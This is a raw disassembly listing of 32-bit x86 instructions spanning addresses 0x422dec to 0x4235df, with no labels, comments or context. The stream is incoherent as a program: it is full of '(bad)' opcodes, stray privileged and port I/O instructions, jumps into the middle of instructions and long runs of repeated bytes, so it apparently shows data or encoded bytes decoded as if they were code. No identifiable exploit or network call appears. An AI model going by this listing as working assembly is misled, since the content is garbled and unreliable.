  422dec:	sub    ebp,0xffffffcb
  422def:	out    dx,al
  422df0:	in     al,0xd3
  422df2:	add    BYTE PTR ds:0x3a83b7ed,0xb6
  422df9:	mov    ch,ch
  422dfb:	lock or DWORD PTR [ecx+esi*4],0xffffffed
  422e00:	retf   
  422e01:	mov    eax,ds:0x225e1fd3
  422e06:	or     al,0x8d
  422e08:	lea    eax,[ebx-0x4e]
  422e0b:	adc    BYTE PTR [ecx+0x72],0xb7
  422e0f:	sub    esp,0x77
  422e12:	xor    DWORD PTR [esi-0x288137c],0x50
  422e19:	ja     0x422dca
  422e1b:	les    eax,FWORD PTR [edi-0x13]
  422e1e:	mov    dh,ch
  422e20:	xchg   BYTE PTR [eax],bh
  422e22:	lea    ecx,[ebp-0x493b4973]
  422e28:	mov    bh,0x83
  422e2a:	pop    edi
  422e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e2c:	test   ah,ah
  422e2e:	outs   dx,DWORD PTR ds:[esi]
  422e2f:	dec    ebp
  422e30:	ja     0x422db5
  422e32:	aas    
  422e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e34:	test   BYTE PTR [ecx+0x755e86d7],dh
  422e3a:	outs   dx,DWORD PTR ds:[esi]
  422e3b:	lea    ecx,[ebp+0x50fd77ec]
  422e41:	ja     0x422df2
  422e43:	mov    dl,0xb7
  422e45:	sub    esi,0xffffffe2
  422e48:	out    dx,al
  422e49:	test   eax,0x807b4d43
  422e4e:	jl     0x422dd0
  422e50:	(bad)  
  422e51:	scas   eax,DWORD PTR es:[edi]
  422e52:	xchg   al,ah
  422e54:	lea    ecx,[ebp-0x2ac5c173]
  422e5a:	in     al,dx
  422e5b:	xor    bh,ah
  422e5d:	xor    DWORD PTR [esi-0x78284e44],0xffffffc4
  422e64:	lea    ecx,[ebp+0x77]
  422e67:	add    DWORD PTR [eax-0x4d120610],0xc
  422e6e:	and    bh,0x8a
  422e71:	cmp    BYTE PTR [ebx+eax*2+0x77],0x35
  422e76:	pop    edi
  422e77:	ja     0x422dfc
  422e79:	fcmovnu st,st(2)
  422e7b:	or     BYTE PTR [ebx+0x43],0xd7
  422e7f:	add    DWORD PTR [eax-0xab9c269],0x63
  422e86:	test   ebx,edx
  422e88:	in     al,dx
  422e89:	jg     0x422e62
  422e8b:	dec    ebx
  422e8c:	push   eax
  422e8d:	out    0x8a,eax
  422e8f:	or     eax,esp
  422e91:	xor    ah,BYTE PTR [ebx-0x19]
  422e94:	cmp    eax,0xccaaea09
  422e99:	dec    ebp
  422e9a:	dec    ebp
  422e9b:	xchg   dl,dl
  422e9d:	lea    ecx,[ebp+0x16a438d]
  422ea3:	lds    esi,FWORD PTR ds:0x2d978065
  422ea9:	adc    bh,0x8b
  422eac:	inc    ebx
  422ead:	xlat   BYTE PTR ds:[ebx]
  422eae:	sbb    eax,0x9780d450
  422eb3:	inc    ebp
  422eb4:	and    bh,0x8a
  422eb7:	inc    ebx
  422eb8:	out    0x35,eax
  422eba:	push   eax
  422ebb:	(bad)  
  422ebc:	jo     0x422e61
  422ebe:	test   eax,0x8d25fbab
  422ec3:	test   eax,0x6d6a439d
  422ec8:	les    eax,FWORD PTR [edx-0x7272f95e]
  422ece:	lea    edi,[edx]
  422ed0:	in     al,0x3a
  422ed2:	je     0x422e86
  422ed4:	mov    ah,0xef
  422ed6:	cdq    
  422ed7:	adc    bh,0x8b
  422eda:	arpl   di,dx
  422edc:	and    eax,0x7780f9d3
  422ee1:	test   BYTE PTR [edx+0x5046ef84],dh
  422ee7:	ja     0x422e6d
  422ee9:	push   eax
  422eea:	xlat   BYTE PTR ds:[ebx]
  422eeb:	mov    ebp,DWORD PTR [ecx+0x76f08074]
  422ef1:	or     eax,esp
  422ef3:	push   0xffffffb2
  422ef5:	mov    edx,0x8677ecee
  422efa:	in     al,dx
  422efb:	mov    dl,0xc4
  422efd:	outs   dx,DWORD PTR ds:[esi]
  422efe:	or     eax,esp
  422f00:	push   0xffffffec
  422f02:	ja     0x422f7a
  422f04:	add    bh,0xfd
  422f07:	add    ebp,eax
  422f09:	ja     0x422e98
  422f0b:	inc    ebx
  422f0c:	push   0x1
  422f0e:	lds    esi,FWORD PTR [edi-0x73]
  422f11:	mov    ds:0x8d8d8d06,al
  422f16:	cmp    dl,bl
  422f18:	and    eax,0x5d353180
  422f1d:	mov    dl,0xb5
  422f1f:	xor    eax,0x3163ef2d
  422f24:	xor    eax,0x8f26d3a5
  422f29:	push   cs
  422f2a:	dec    ebp
  422f2b:	jne    0x422f62
  422f2d:	pop    ebp
  422f2e:	mov    dl,0xb4
  422f30:	out    dx,eax
  422f31:	adc    BYTE PTR [ebp+0x11802d35],dl
  422f37:	or     DWORD PTR [edi+edx*4-0x73],ebx
  422f3b:	mov    dl,0xbe
  422f3d:	dec    DWORD PTR [ecx]
  422f3f:	and    bh,dh
  422f41:	pop    edi
  422f42:	xor    DWORD PTR ds:0x801bd32d,esi
  422f48:	mov    al,ds:0x8def8d60
  422f4d:	lea    eax,[ebx-0x2]
  422f50:	mov    dl,0xbe
  422f52:	das    
  422f53:	mov    ecx,0xec8df03a
  422f58:	push   0x1
  422f5a:	lds    esi,FWORD PTR ds:0x7b2746d
  422f60:	das    
  422f61:	aas    
  422f62:	xor    DWORD PTR ds:0xb9a0432d,esi
  422f68:	aas    
  422f69:	xchg   edi,eax
  422f6a:	(bad)  
  422f6b:	in     al,dx
  422f6c:	push   0xffffffed
  422f6e:	push   0x3a
  422f70:	add    ebp,eax
  422f72:	xor    eax,0x8099746d
  422f77:	sub    al,BYTE PTR [esi+0x4d4d069c]
  422f7d:	sbb    BYTE PTR [eax+eax*4+0x6ffc51],0x86
  422f85:	repnz push es
  422f87:	dec    ebp
  422f88:	dec    ebp
  422f89:	cdq    
  422f8a:	sub    BYTE PTR [edx],0xfc
  422f8d:	jns    0x422fbe
  422f8f:	stos   DWORD PTR es:[edi],eax
  422f90:	xchg   BYTE PTR [ebx-0x66b2b2fa],dh
  422f96:	cld    
  422f97:	jns    0x423008
  422f99:	mov    ds:0x4d063986,eax
  422f9e:	dec    ebp
  422f9f:	cld    
  422fa0:	jns    0x422fae
  422fa2:	cdq    
  422fa3:	cmp    BYTE PTR [esi-0x42],0xc4
  422fa7:	test   DWORD PTR [ebp+0x4d],ecx
  422faa:	xchg   edi,eax
  422fab:	add    BYTE PTR [edi+0x3a4587a2],0x8d
  422fb2:	lea    edi,[edi+esi*2-0x75]
  422fb6:	mul    BYTE PTR [edi+ebp*2]
  422fb9:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  422fbd:	cmc    
  422fbe:	and    al,0x6f
  422fc0:	cmp    BYTE PTR [eax+0x7750ef77],al
  422fc6:	out    dx,eax
  422fc7:	xor    BYTE PTR [edi-0x75],0x80
  422fcb:	xchg   edi,eax
  422fcc:	mov    edx,DWORD PTR [ebx+0xde29b99]
  422fd2:	lahf   
  422fd3:	push   ebx
  422fd4:	mov    dh,0xb2
  422fd6:	clc    
  422fd7:	sub    DWORD PTR [edx+eiz*1+0x24],esp
  422fdb:	outs   dx,DWORD PTR ds:[esi]
  422fdc:	cmp    BYTE PTR [ebx+0x74],dl
  422fdf:	mov    dl,0x86
  422fe1:	or     al,0xff
  422fe3:	sti    
  422fe4:	push   eax
  422fe5:	ja     0x42305d
  422fe7:	xor    BYTE PTR [edi-0x75],0x80
  422feb:	xchg   edi,eax
  422fec:	mov    edx,DWORD PTR [ebx+0x74]
  422fef:	mov    dl,0x86
  422ff1:	or     al,0x53
  422ff3:	mov    dh,0xb2
  422ff5:	clc    
  422ff6:	sub    edi,edi
  422ff8:	sti    
  422ff9:	push   eax
  422ffa:	ja     0x422f86
  422ffc:	xor    BYTE PTR [edi-0x75],0x80
  423000:	xchg   edi,eax
  423001:	mov    edx,DWORD PTR [ebx+0x74]
  423004:	mov    dl,0x86
  423006:	or     al,0x53
  423008:	mov    dh,0xb2
  42300a:	clc    
  42300b:	sub    edi,edi
  42300d:	sti    
  42300e:	push   eax
  42300f:	ja     0x423073
  423011:	xor    BYTE PTR [edi-0x75],0x80
  423015:	xchg   edi,eax
  423016:	mov    edx,DWORD PTR [ebx+0x74]
  423019:	mov    dl,0x86
  42301b:	or     al,0x53
  42301d:	mov    dh,0xb2
  42301f:	clc    
  423020:	sub    edi,edi
  423022:	sti    
  423023:	push   eax
  423024:	ja     0x422fac
  423026:	jl     0x42309f
  423028:	mul    BYTE PTR cs:[esi+ebp*8]
  42302c:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423030:	mul    BYTE PTR [ebx+0x777c386f]
  423036:	es cli 
  423038:	and    al,0x6f
  42303a:	cmp    dl,ah
  42303c:	cmp    eax,0x6277509d
  423041:	push   eax
  423042:	ja     0x4230a6
  423044:	loop   0x423003
  423046:	popf   
  423047:	push   eax
  423048:	ja     0x4230ac
  42304a:	push   eax
  42304b:	ja     0x4230af
  42304d:	jl     0x4230c6
  42304f:	bound  ecx,QWORD PTR [edx]
  423051:	lea    ecx,[ebp+0x62777c8d]
  423057:	jns    0x422fe6
  423059:	lea    ecx,[ebp-0x7f748880]
  42305f:	xchg   edi,eax
  423060:	mov    edx,DWORD PTR [ebx+0x74]
  423063:	push   ebx
  423064:	mov    dh,0xb2
  423066:	xchg   BYTE PTR [edx+esi*4],cl
  423069:	clc    
  42306a:	sub    edi,edi
  42306c:	sti    
  42306d:	push   eax
  42306e:	ja     0x4230d2
  423070:	xor    BYTE PTR [edi-0x75],0x80
  423074:	xchg   edi,eax
  423075:	mov    edx,DWORD PTR [ebx+0x74]
  423078:	push   ebx
  423079:	mov    dh,0xb2
  42307b:	xchg   BYTE PTR [edx+esi*4],cl
  42307e:	clc    
  42307f:	sub    edi,edi
  423081:	sti    
  423082:	push   eax
  423083:	ja     0x4230e7
  423085:	jl     0x4230fe
  423087:	jp     0x42302c
  423089:	or     al,0x8d
  42308b:	lea    edi,[edi+esi*2-0x7c]
  42308f:	pop    edi
  423090:	lea    ecx,[ebp-0x50888373]
  423096:	out    0x8d,eax
  423098:	lea    ecx,[ebp+0xdc86801]
  42309e:	dec    ebp
  42309f:	dec    ebp
  4230a0:	add    DWORD PTR [eax+0x7a],ebx
  4230a3:	or     eax,0xfe864d4d
  4230a8:	or     eax,0xf04d4d4d
  4230ad:	scas   eax,DWORD PTR es:[edi]
  4230ae:	xlat   BYTE PTR ds:[ebx]
  4230af:	pop    es
  4230b0:	dec    ebp
  4230b1:	lock test bh,dl
  4230b4:	add    al,0x4d
  4230b6:	lock jp 0x423090
  4230b9:	jb     0x423137
  4230bb:	ja     0x423041
  4230bd:	mov    eax,ds:0x808d8d6d
  4230c2:	ja     0x42304f
  4230c4:	xor    al,0x8b
  4230c7:	push   ebx
  4230c8:	je     0x42307c
  4230ca:	xchg   BYTE PTR [edx+eiz*8],cl
  4230cd:	or     eax,0xb25153a9
  4230d2:	mov    edx,0x50b2ff29
  4230d7:	ja     0x423143
  4230d9:	xor    BYTE PTR [edi-0x75],0x80
  4230dd:	lock mov ebp,ebp
  4230e0:	mov    bh,0xc8
  4230e2:	lea    edx,[ebx+0x74]
  4230e5:	mov    dl,0x86
  4230e7:	or     al,0x53
  4230e9:	push   ecx
  4230ea:	mov    dl,0xba
  4230ec:	sub    edi,edi
  4230ee:	mov    dl,0x50
  4230f0:	ja     0x42316c
  4230f2:	mov    ch,0x4a
  4230f4:	sbb    eax,0x508d8d8d
  4230f9:	ja     0x4230c3
  4230fb:	sub    BYTE PTR [ebp-0x7f],0x50
  4230ff:	ja     0x423088
  423101:	sub    BYTE PTR [ebp+0x21],0x50
  423105:	ja     0x423139
  423107:	xor    BYTE PTR [edi-0x11],0x1
  42310b:	lock enter 0x1050,0x62
  423110:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  423116:	add    eax,esi
  423118:	xchg   DWORD PTR [eax+0x10],edx
  42311b:	push   esi
  42311c:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  423122:	dec    ebp
  423123:	xlat   BYTE PTR ds:[ebx]
  423124:	out    dx,eax
  423125:	add    eax,esi
  423127:	xor    dl,BYTE PTR [eax+0x10]
  42312a:	pop    esi
  42312b:	cmp    cl,BYTE PTR [ebp+0x3fba868d]
  423131:	lea    ecx,[ebp-0x7f740f80]
  423137:	xchg   edi,eax
  423138:	mov    edx,DWORD PTR [ebx+0x11]
  42313b:	push   ebx
  42313c:	jle    0x4230f0
  42313e:	mov    esi,0x29f8b20c
  423143:	(bad)  
  423144:	(bad)  
  423145:	arpl   bp,di
  423147:	or     DWORD PTR [edi],ecx
  423149:	(bad)  
  42314a:	in     al,dx
  42314b:	lea    ecx,[ebp-0x7f108880]
  423151:	int    0x36
  423153:	cmp    cl,BYTE PTR [ebp-0x7f107f73]
  423159:	ja     0x42314a
  42315b:	or     ch,0x36
  42315e:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  423164:	xchg   edx,eax
  423165:	gs xor al,0xef
  423169:	adc    BYTE PTR [eax+0x32],0x3a
  42316d:	lea    ecx,[ebp+0x4d151801]
  423173:	dec    ebp
  423174:	dec    ebp
  423175:	stos   BYTE PTR es:[edi],al
  423176:	adc    BYTE PTR [edi+0x26d180ef],0x3a
  42317d:	lea    ecx,[ebp+0x5aec9080]
  423183:	adc    BYTE PTR [ebp-0x111d7273],cl
  423189:	dec    ebp
  42318a:	bound  eax,QWORD PTR [ecx-0x73]
  42318d:	lea    ecx,[ebp+0x25964daa]
  423193:	push   ebx
  423194:	push   0x7c
  423196:	dec    edi
  423197:	push   ebp
  423198:	dec    ebp
  423199:	dec    ebp
  42319a:	dec    ebp
  42319b:	outs   dx,BYTE PTR ds:[esi]
  42319c:	mov    ds:0x4f7c0a43,eax
  4231a1:	pop    ebp
  4231a2:	dec    ebp
  4231a3:	dec    ebp
  4231a4:	dec    ebp
  4231a5:	jg     0x423155
  4231a7:	push   ebp
  4231a8:	fwait
  4231a9:	jl     0x4231fa
  4231ab:	gs dec ebp
  4231ad:	dec    ebp
  4231ae:	dec    ebp
  4231af:	stos   DWORD PTR es:[edi],eax
  4231b0:	lock scas al,BYTE PTR es:[edi]
  4231b2:	aas    
  4231b3:	cld    
  4231b4:	dec    edi
  4231b5:	ins    DWORD PTR es:[edi],dx
  4231b6:	dec    ebp
  4231b7:	dec    ebp
  4231b8:	dec    ebp
  4231b9:	xchg   BYTE PTR [ecx],al
  4231bb:	push   0x4d4d4d92
  4231c0:	inc    esp
  4231c1:	mov    ecx,0x6a53f544
  4231c6:	jl     0x423217
  4231c8:	sub    eax,0x6e4d4d4d
  4231cd:	mov    ds:0x4f7c0a43,eax
  4231d2:	xor    eax,0x7f4d4d4d
  4231d7:	scas   al,BYTE PTR es:[edi]
  4231d8:	push   ebp
  4231d9:	fwait
  4231da:	jl     0x42322b
  4231dc:	cmp    eax,0xab4d4d4d
  4231e1:	lock scas al,BYTE PTR es:[edi]
  4231e3:	imul   edi,esp,0x4f
  4231e6:	inc    ebp
  4231e7:	dec    ebp
  4231e8:	dec    ebp
  4231e9:	dec    ebp
  4231ea:	xchg   BYTE PTR [ecx],al
  4231ec:	push   0x4d4d4d47
  4231f1:	inc    esp
  4231f2:	mov    ecx,0x7780f544
  4231f7:	out    dx,eax
  4231f8:	or     ch,0x32
  4231fb:	cmp    cl,BYTE PTR [ebp-0x10187f73]
  423201:	in     eax,dx
  423202:	push   0x71
  423204:	push   eax
  423205:	ja     0x42323d
  423207:	xor    BYTE PTR [edi-0x11],0x80
  42320b:	int    0xfd
  42320d:	cmp    cl,BYTE PTR [ebp-0x32888373]
  423213:	xchg   ebp,eax
  423214:	mov    ds:0x777caea5,eax
  423219:	lldt   WORD PTR [edi+0x7cb9969d]
  423220:	ja     0x423232
  423222:	aas    
  423223:	xchg   BYTE PTR [edi+ecx*2-0x3b],bh
  423227:	dec    ebp
  423228:	dec    ebp
  423229:	dec    ebp
  42322a:	outs   dx,BYTE PTR ds:[esi]
  42322b:	mov    ds:0x4f7c0a43,eax
  423230:	push   edx
  423231:	dec    ebp
  423232:	dec    ebp
  423233:	dec    ebp
  423234:	jg     0x4231e4
  423236:	aas    
  423237:	xchg   ebp,eax
  423238:	jl     0x423289
  42323a:	aad    0x4d
  42323c:	dec    ebp
  42323d:	dec    ebp
  42323e:	popf   
  42323f:	or     bh,BYTE PTR [edi+0x59]
  423242:	jl     0x423293
  423244:	fisttp QWORD PTR [ebp+0x4d]
  423247:	dec    ebp
  423248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423249:	xchg   edi,eax
  42324a:	lock scas al,BYTE PTR es:[edi]
  42324c:	jl     0x42329d
  42324e:	in     eax,0x4d
  423250:	dec    ebp
  423251:	dec    ebp
  423252:	xchg   esi,eax
  423253:	add    BYTE PTR [edi],bh
  423255:	xchg   BYTE PTR [edi+ecx*2-0x63],bh
  423259:	dec    ebp
  42325a:	dec    ebp
  42325b:	dec    ebp
  42325c:	outs   dx,BYTE PTR ds:[esi]
  42325d:	mov    ds:0x4f7c0a43,eax
  423262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423263:	dec    ebp
  423264:	dec    ebp
  423265:	dec    ebp
  423266:	jg     0x423216
  423268:	aas    
  423269:	xchg   ebp,eax
  42326a:	jl     0x4232bb
  42326c:	lods   eax,DWORD PTR ds:[esi]
  42326d:	dec    ebp
  42326e:	dec    ebp
  42326f:	dec    ebp
  423270:	popf   
  423271:	or     bh,BYTE PTR [edi+0x59]
  423274:	jl     0x4232c5
  423276:	mov    ch,0x4d
  423278:	dec    ebp
  423279:	dec    ebp
  42327a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42327b:	xchg   edi,eax
  42327c:	lock scas al,BYTE PTR es:[edi]
  42327e:	jl     0x4232cf
  423280:	mov    ebp,0x964d4d4d
  423285:	add    BYTE PTR [ebx-0x7a],ch
  423288:	xchg   BYTE PTR [edx+0x3d],ah
  42328b:	lea    ecx,[ebp+0x3677800a]
  423291:	dec    ebp
  423292:	jno    0x423214
  423294:	ja     0x423221
  423296:	xor    al,0x8b
  423299:	push   ebx
  42329a:	je     0x4232ef
  42329c:	push   ecx
  42329d:	mov    dl,0xba
  42329f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4232a5:	xor    al,0x84
  4232a8:	arpl   WORD PTR [edx+0x3aca0f09],si
  4232ae:	lea    ecx,[ebp-0x7f068880]
  4232b4:	lock stc 
  4232b6:	push   ebx
  4232b7:	je     0x42330c
  4232b9:	push   ecx
  4232ba:	mov    dl,0xba
  4232bc:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4232c2:	xor    al,0x84
  4232c5:	inc    ebx
  4232c6:	std    
  4232c7:	xor    BYTE PTR [edi+0x6a],0x63
  4232cb:	mov    dl,0x9
  4232cd:	into   
  4232ce:	xchg   esp,eax
  4232cf:	cmp    cl,BYTE PTR [ebp+0x3e777c8d]
  4232d5:	lea    ecx,[ebp+0x77808d8d]
  4232db:	out    dx,eax
  4232dc:	and    BYTE PTR [edx+0x32],0x3a
  4232e0:	lea    ecx,[ebp-0x7f101880]
  4232e6:	ja     0x4232d7
  4232e8:	or     ch,0x76
  4232eb:	cmp    cl,BYTE PTR [ebp+0x3dda868d]
  4232f1:	lea    ecx,[ebp+0x71994d0a]
  4232f7:	xor    al,0xef
  4232fa:	adc    BYTE PTR [eax+0x46],0x3a
  4232fe:	lea    ecx,[ebp+0x77803a50]
  423304:	out    dx,eax
  423305:	sbb    BYTE PTR [esi+0x32],0x3a
  423309:	lea    ecx,[ebp+0x53efd780]
  42330f:	push   0x1
  423311:	sbb    BYTE PTR [ebp-0x79b2b2b3],bl
  423317:	fwait
  423318:	cmp    eax,0x800a8d8d
  42331d:	ja     0x42330e
  42331f:	or     ch,0x46
  423322:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  423328:	fwait
  423329:	out    dx,eax
  42332a:	push   eax
  42332b:	ja     0x423343
  42332d:	xor    BYTE PTR [edi-0x11],0x80
  423331:	pop    esi
  423332:	xor    bh,BYTE PTR [edx]
  423334:	lea    ecx,[ebp+0x53efd780]
  42333a:	push   0x1
  42333c:	sbb    ch,al
  42333e:	dec    ebp
  42333f:	dec    ebp
  423340:	dec    ebp
  423341:	xchg   BYTE PTR [ebp+0x3d],al
  423344:	lea    ecx,[ebp-0x10887ff6]
  42334a:	or     ch,0x46
  42334d:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  423353:	fwait
  423354:	out    dx,eax
  423355:	xor    BYTE PTR [edi-0x11],0x80
  423359:	pop    esi
  42335a:	xor    bh,BYTE PTR [edx]
  42335c:	lea    ecx,[ebp+0x53efd780]
  423362:	push   0x1
  423364:	sbb    BYTE PTR [ebp+0x4d],dl
  423367:	dec    ebp
  423368:	dec    ebp
  423369:	xchg   dh,ch
  42336b:	cmp    eax,0x800a8d8d
  423370:	ja     0x423361
  423372:	or     ch,0x46
  423375:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  42337b:	fwait
  42337c:	out    dx,eax
  42337d:	in     eax,dx
  42337e:	mov    bh,0x5e
  423380:	lea    edx,[eax+0x77]
  423383:	xor    BYTE PTR ss:[edi+0x5e],0xe2
  423388:	pop    ds
  423389:	push   ebx
  42338a:	jb     0x42332b
  42338c:	dec    ebx
  42338d:	add    eax,0x992fbcd
  423392:	loopne 0x42338f
  423394:	or     cl,BYTE PTR [ebp-0x69]
  423397:	ss dec edi
  423399:	push   0xffffffd7
  42339b:	arpl   WORD PTR [eax-0x7b12a189],ax
  4233a1:	mov    ebp,gs
  4233a3:	push   0x6e
  4233a5:	or     cl,BYTE PTR [ebp-0x69]
  4233a8:	push   ss
  4233a9:	dec    edi
  4233aa:	push   0xffffffd5
  4233ac:	rol    BYTE PTR [eax+0x5e80ef77],cl
  4233b2:	xor    bh,BYTE PTR [edx]
  4233b4:	lea    ecx,[ebp+0x53efd780]
  4233ba:	push   0x1
  4233bc:	xchg   edi,eax
  4233bd:	int    0x86
  4233bf:	and    bh,BYTE PTR [ebx]
  4233c1:	lea    ecx,[ebp-0x10887ff6]
  4233c7:	or     ch,0x3e
  4233ca:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4233d0:	fwait
  4233d1:	out    dx,eax
  4233d2:	push   eax
  4233d3:	ja     0x423384
  4233d5:	(bad)  
  4233d6:	out    dx,al
  4233d7:	in     eax,dx
  4233d8:	mov    bh,0xaf
  4233da:	lea    ecx,[ebp+0x77]
  4233dd:	pop    esi
  4233de:	in     eax,dx
  4233df:	out    0x5e,eax
  4233e1:	sub    eax,0x77802ee4
  4233e6:	stc    
  4233e7:	xor    al,0xf9
  4233ea:	adc    bh,0xef
  4233ed:	loop   0x4233fc
  4233ef:	stos   DWORD PTR es:[edi],eax
  4233f0:	push   ebx
  4233f1:	je     0x423446
  4233f3:	sub    dh,BYTE PTR [edx-0x454df37a]
  4233f9:	sub    edi,edi
  4233fb:	mov    dl,0x1
  4233fd:	sbb    al,cl
  4233ff:	or     eax,0xc3864d4d
  423404:	cmp    ecx,DWORD PTR [ebp+0x77800a8d]
  42340a:	mov    eax,DWORD PTR [eax-0x287f7410]
  423410:	out    dx,eax
  423411:	push   ebx
  423412:	je     0x423467
  423414:	sub    dh,BYTE PTR [edx-0x454df37a]
  42341a:	sub    edi,edi
  42341c:	mov    dl,0x1
  42341e:	sbb    BYTE PTR [edx+0xd],bh
  423421:	dec    ebp
  423422:	dec    ebp
  423423:	xchg   dl,bl
  423425:	cmp    ecx,DWORD PTR [ebp-0x68b2f573]
  42342b:	scas   eax,DWORD PTR es:[edi]
  42342c:	xor    al,0x8b
  42342f:	adc    BYTE PTR [edi+0x5311538b],0x9c
  423436:	mov    dl,0xbe
  423438:	or     al,0xb2
  42343a:	clc    
  42343b:	sub    edi,edi
  42343d:	(bad)  
  42343e:	arpl   bp,di
  423440:	xlat   BYTE PTR ds:[ebx]
  423441:	mov    WORD PTR [edi+esi*2+0x3e],?
  423445:	cmp    cl,BYTE PTR [ebp+0x77808d8d]
  42344b:	stc    
  42344c:	xor    al,0xf9
  42344f:	push   ebx
  423450:	je     0x423404
  423452:	xchg   BYTE PTR [ebx+edx*2],cl
  423455:	sub    dh,BYTE PTR [edx-0x4d00d646]
  42345b:	in     al,dx
  42345c:	ja     0x4234c8
  42345e:	push   eax
  42345f:	ja     0x4234cb
  423461:	xor    BYTE PTR [edi+0x3e],0x4f
  423465:	push   0xffffffd5
  423467:	sbb    eax,0x80f97780
  42346c:	lock stc 
  42346e:	push   ebx
  42346f:	je     0x4234c4
  423471:	sub    dh,BYTE PTR [edx-0x454df37a]
  423477:	sub    edi,edi
  423479:	mov    dl,0xec
  42347b:	ja     0x4234f7
  42347d:	push   eax
  42347e:	ja     0x4234fa
  423480:	xor    BYTE PTR [edi-0x7],0x80
  423484:	lock stc 
  423486:	push   ebx
  423487:	je     0x4234dc
  423489:	sub    dh,BYTE PTR [edx-0x794dd646]
  42348f:	or     al,0xff
  423491:	mov    dl,0x80
  423493:	lock test BYTE PTR [ebx-0x3],al
  423497:	xor    BYTE PTR [edi+0x6a],0x63
  42349b:	mov    dl,0x9
  42349d:	dec    esp
  42349e:	or     DWORD PTR ds:0xde24d4d,0x7a7780a9
  4234a8:	xor    al,0x6a
  4234ab:	arpl   bp,di
  4234ad:	xlat   BYTE PTR ds:[ebx]
  4234ae:	push   cs
  4234af:	dec    ebp
  4234b0:	xlat   BYTE PTR ds:[ebx]
  4234b1:	out    dx,eax
  4234b2:	add    DWORD PTR [edi-0x76],esi
  4234b5:	or     al,BYTE PTR [esi-0x7272809a]
  4234bb:	push   eax
  4234bc:	ja     0x423534
  4234be:	les    ebx,FWORD PTR [ebx]
  4234c0:	xor    BYTE PTR [edi+0x76],0x80
  4234c4:	lock stc 
  4234c6:	adc    BYTE PTR [edi+0x531153f9],0x7e
  4234cd:	mov    dl,0xbe
  4234cf:	or     al,0xb2
  4234d1:	clc    
  4234d2:	sub    edi,edi
  4234d4:	(bad)  
  4234d5:	outs   dx,BYTE PTR ds:[esi]
  4234d6:	out    dx,eax
  4234d7:	xor    BYTE PTR [edi-0x75],0x80
  4234db:	lock mov edx,DWORD PTR [ebx+0x74]
  4234df:	push   ebx
  4234e0:	push   ecx
  4234e1:	mov    dl,0xba
  4234e3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4234e9:	xor    al,0x76
  4234ec:	arpl   WORD PTR [edx-0x33f0f7],si
  4234f2:	lea    ecx,[ebp-0x7f748880]
  4234f8:	lock mov edx,DWORD PTR [ebx+0x74]
  4234fc:	push   ebx
  4234fd:	push   ecx
  4234fe:	mov    dl,0xba
  423500:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423506:	xor    al,0x8a
  423509:	arpl   WORD PTR [edx-0x7bf0f7],si
  42350f:	lea    ecx,[ebp-0x7f748880]
  423515:	lock mov edx,DWORD PTR [ebx+0x74]
  423519:	push   ebx
  42351a:	push   ecx
  42351b:	mov    dl,0x86
  42351d:	or     al,0xb2
  42351f:	mov    edx,0xc4b2ff29
  423524:	adc    eax,0x80f9f080
  423529:	xchg   edi,eax
  42352a:	stc    
  42352b:	push   ebx
  42352c:	adc    DWORD PTR [ebx+0x7e],edx
  42352f:	mov    dl,0xbe
  423531:	or     al,0xb2
  423533:	clc    
  423534:	sub    edi,edi
  423536:	(bad)  
  423537:	in     al,dx
  423538:	mov    dl,0x80
  42353a:	lock mov ah,BYTE PTR [ebx-0x4e]
  42353e:	in     al,0xb8
  423540:	xor    BYTE PTR [edi-0x76],0x50
  423544:	ja     0x4234ca
  423546:	xor    BYTE PTR [edi+0x76],0x50
  42354a:	ja     0x4235ae
  42354c:	ins    BYTE PTR es:[edi],dx
  42354d:	mul    BYTE PTR [edi+ebp*2]
  423550:	cmp    BYTE PTR [eax-0x19],dl
  423553:	inc    esi
  423554:	jl     0x4235cd
  423556:	xor    ch,0x24
  423559:	outs   dx,DWORD PTR ds:[esi]
  42355a:	cmp    BYTE PTR [eax-0xf7fb989],al
  423560:	inc    esi
  423561:	push   ebx
  423562:	je     0x4235b7
  423564:	push   ecx
  423565:	mov    dl,0x86
  423567:	or     al,0xb2
  423569:	mov    edx,0x50b2ff29
  42356e:	ja     0x4235c6
  423570:	xor    BYTE PTR [edi+0x46],0x80
  423574:	lock inc esi
  423576:	push   ebx
  423577:	je     0x4235cc
  423579:	push   ecx
  42357a:	mov    dl,0x86
  42357c:	or     al,0xb2
  42357e:	mov    edx,0x50b2ff29
  423583:	ja     0x4235ff
  423585:	jl     0x4235fe
  423587:	ds dec ecx
  423589:	and    al,0x6f
  42358b:	cmp    BYTE PTR [edi+esi*2+0x1e],bh
  42358f:	fisub  WORD PTR [edi+ebp*2]
  423592:	cmp    BYTE PTR [eax-0xf7fb989],al
  423598:	inc    esi
  423599:	push   ebx
  42359a:	je     0x4235ef
  42359c:	push   ecx
  42359d:	mov    dl,0xba
  42359f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4235a5:	xor    al,0x84
  4235a8:	arpl   bp,di
  4235aa:	or     DWORD PTR [edi],ecx
  4235ac:	pop    ss
  4235ad:	in     al,dx
  4235ae:	lea    ecx,[ebp-0x72f35f42]
  4235b4:	lea    eax,[eax+0x77803ef0]
  4235ba:	adc    BYTE PTR ds:[edi+0x53fc5356],0x11
  4235c2:	mov    dl,0x84
  4235c4:	sub    DWORD PTR [edx-0x200f342],esi
  4235ca:	xor    BYTE PTR [edi-0x7c],0x43
  4235ce:	sti    
  4235cf:	push   ebx
  4235d0:	jb     0x42361d
  4235d2:	add    eax,0x807a7750
  4235d7:	ja     0x4235f7
  4235d9:	xor    al,0x1e
  4235dc:	push   ebx
  4235dd:	je     0x423632
  4235df:	push   ecx
